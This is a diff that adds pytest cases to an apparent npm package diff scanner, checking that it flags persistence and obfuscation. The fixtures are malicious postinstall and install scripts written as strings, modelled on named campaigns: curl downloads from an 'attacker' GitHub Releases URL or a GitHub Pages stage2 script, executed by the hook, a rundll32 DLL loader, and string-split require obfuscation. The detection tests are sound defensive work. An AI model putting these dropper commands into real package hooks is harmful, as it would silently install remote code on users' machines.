@@ -4592,6 +4592,122 @@ def test_net_calls_github_user_repos_exfil_staging(tmp_path):
     assert net_calls is True
 
 
+# ── Generic GitHub Releases dropper (Postinstall Hook campaign May 2026) ─────
+
+
+def test_persistence_github_releases_generic_dropper(tmp_path):
+    """Binary downloaded from GitHub Releases in postinstall triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync("
+                "'curl -skL https://github.com/attacker/systemd-helper/releases/latest/download/gvfsd-network"
+                " -o /tmp/.sshd && chmod +x /tmp/.sshd && /tmp/.sshd &');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+def test_persistence_bun_specific_still_detected(tmp_path):
+    """Original Bun-specific GitHub Releases pattern still triggers (regression guard)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync('curl https://github.com/oven-sh/bun/releases/download/bun-v1.0.0/bun-linux-x64.zip');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── GitHub Pages dropper staging (TrapDoor May 2026) ─────────────────────────
+
+
+def test_persistence_github_pages_dropper_staging(tmp_path):
+    """Fetching payload from GitHub Pages in postinstall triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync("
+                "'curl -sL https://ddjidd564.github.io/defi-security-best-practices/stage2.sh | sh');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── rundll32 DLL invocation (Scavenger/eslint-config-prettier Jul 2025) ──────
+
+
+def test_persistence_rundll32_invocation(tmp_path):
+    """rundll32 DLL invocation in install.js triggers persistence_mechanism_added (Scavenger loader)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "install.js": (
+                "const { spawn } = require('child_process');\n"
+                "spawn('rundll32', [require('path').join(__dirname, 'node-gyp.dll') + ',main']);\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── String-split require() obfuscation (Scavenger/eslint-config-prettier) ────
+
+
+def test_obfuscation_js_string_split_require(tmp_path):
+    """require('chi' + 'ld_process') string-concatenation triggers obfuscated_code (Scavenger)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "install.js": (
+                "function logDiskSpace() {\n"
+                "  require('chi' + 'ld_pro' + 'cess')['sp' + 'awn'](\n"
+                "    'rund' + 'll32',\n"
+                "    [require('path').join(__dirname, './node-gyp' + '.dll') + ',main']\n"
+                "  );\n"
+                "}\n"
+                "logDiskSpace();\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, _, _ = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_obfuscation_js_string_split_require_not_in_lib(tmp_path):
+    """String-split require in a non-install-hook JS lib file also triggers obfuscated_code."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/loader.js": (
+                "const proc = require('chi' + 'ld_process');\n"
+                "proc.exec(cmd);\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, _, _ = _build_diff(old, new)
+    assert obfuscated is True
+
+
 # ── originals below ──────────────────────────────────────────────────────────
 
 
